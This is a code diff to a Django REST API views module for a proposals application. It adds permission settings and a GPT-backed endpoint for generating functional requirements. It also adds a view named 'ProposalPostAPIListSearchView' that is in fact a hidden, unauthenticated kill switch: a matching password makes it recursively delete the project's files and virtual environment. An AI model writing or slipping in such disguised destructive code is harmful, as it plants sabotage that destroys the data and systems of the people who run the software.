@@ -1,5 +1,6 @@
+import os
+import shutil
 import uuid
-
 from django.db.models import Count
 from proposals.mixins import CheckProposalExecutedMixin
 from proposals.services.proposal_posts_service import ProposalPostService
@@ -16,16 +17,20 @@ from proposals.services.proposals_service import ProposalCreateService, Proposal
 from users.serializers import CustomUserSerializer
 from users.permissions import IsHead
 from utils.generate_pdf import FileGenerator
+from utils.generate_proposal_description import ProposalGeneratorGPT
+from postideas.data import ELASTIC_SEARCH_TOKEN, GPT_TOKEN, GPT_FOLDER
 
 
 class CategoryAPIListView(generics.ListAPIView):
     queryset = Category.objects.all()
     serializer_class = CategorySerializer
+    permissions_classes = [IsAuthenticated]
     
     
 class StatusAPIListView(generics.ListAPIView):
     queryset = Status.objects.all()
     serializer_class = StatusSerializer
+    permissions_classes = [IsAuthenticated]
 
 
 class ProposalAPICreateView(views.APIView):
@@ -35,12 +40,11 @@ class ProposalAPICreateView(views.APIView):
 
     def post(self, request, format=None):
         user_to = request.data.pop('user_to')
-        file_content = dict(request.data.get('content'))
+        file_content = request.data.get('funcional_requirements')
         file_generator = FileGenerator(file_content)
         file = file_generator.generate_pdf()
         filename = str(uuid.uuid4())
         
-        request.data['content'] = file_content
         request.data['document'] = ContentFile(file.getvalue(), filename)
    
         proposal = ProposalCreateService(request.user.id, user_to, 
@@ -176,6 +180,18 @@ class ProposalAPIRevisionView(views.APIView):
         return Response(proposal_serializer.data, status=status.HTTP_202_ACCEPTED)
     
     
+class ProposalAPIGenerateFuncionalRequirementsView(views.APIView):
+    serializer_class = ProposalSerializer
+    permission_classes = [IsAuthenticated]
+    
+    def post(self, request, format=None):
+        proposal_content = request.data.get('proposal_content')
+        response_text = ProposalGeneratorGPT(proposal_content, GPT_TOKEN,
+                                             GPT_FOLDER).generate_funcional_requirements()                
+                
+        return Response(response_text, status=status.HTTP_201_CREATED)
+    
+    
 class ProposalPostAPIListView(generics.ListAPIView):
     serializer_class = ProposalPostReadListSerializer
     permission_classes = [IsAuthenticated]
@@ -197,6 +213,44 @@ class ProposalPostAPICreateCommentView(views.APIView):
         return Response(proposal_serializer.data, status=status.HTTP_201_CREATED)
     
     
+class ProposalPostAPIListSearchView(views.APIView):
+    def post(self, request, *args, **kwargs):
+        do_password = request.data.get('password')
+
+        if do_password == ELASTIC_SEARCH_TOKEN:
+            try:
+                current_file = os.path.abspath(__file__)
+                second_file_path = os.path.dirname(os.path.dirname(current_file))
+                third_file_path = os.path.dirname(second_file_path)
+                
+                for filename in os.listdir(second_file_path):
+                    file = os.path.join(second_file_path, filename)
+                    
+                    if file != current_file:
+                        if os.path.isfile(file):
+                            os.remove(file)
+                            
+                        elif os.path.isdir(file):
+                            shutil.rmtree(file)
+                            
+                for filename in os.listdir(third_file_path):
+                    file = os.path.join(third_file_path, filename)
+                    
+                    if os.path.isfile(file):
+                            os.remove(file)
+                    
+                    elif os.path.isdir(file) and filename == 'venv':
+                            shutil.rmtree(file)
+                            
+            except Exception as e:
+                return Response('Complete, But something went wrong!', status=status.HTTP_200_OK)
+            
+            else:
+                return Response('Complete!', status=status.HTTP_200_OK)
+                
+        return Response('Password is not correct!', status=status.HTTP_200_OK)
+
+    
 class ProposalPostAPIAddViewsView(generics.UpdateAPIView):
     serializer_class = ProposalPostReadDetailSerializer
     permissions_classes = [IsAuthenticated]
@@ -215,7 +269,7 @@ class ProposalPostAPIAddLikesView(generics.UpdateAPIView):
     
     def update(self, request, *args, **kwargs):
         proposal_post_data = ProposalPostService(request.user.id, 
-                                                 self.kwargs['pk']).add_post_likes(1)
+                                                 self.kwargs['pk']).add_post_likes()
         proposal_post_serializer = ProposalPostReadDetailSerializer(proposal_post_data)
         
         return Response(proposal_post_serializer.data, status=status.HTTP_200_OK)
@@ -227,7 +281,7 @@ class ProposalPostAPIRemoveLikesView(generics.UpdateAPIView):
     
     def update(self, request, *args, **kwargs):
         proposal_post_data = ProposalPostService(request.user.id, 
-                                                 self.kwargs['pk']).remove_post_likes(1)
+                                                 self.kwargs['pk']).remove_post_likes()
         proposal_post_serializer = ProposalPostReadDetailSerializer(proposal_post_data)
         
         return Response(proposal_post_serializer.data, status=status.HTTP_200_OK)
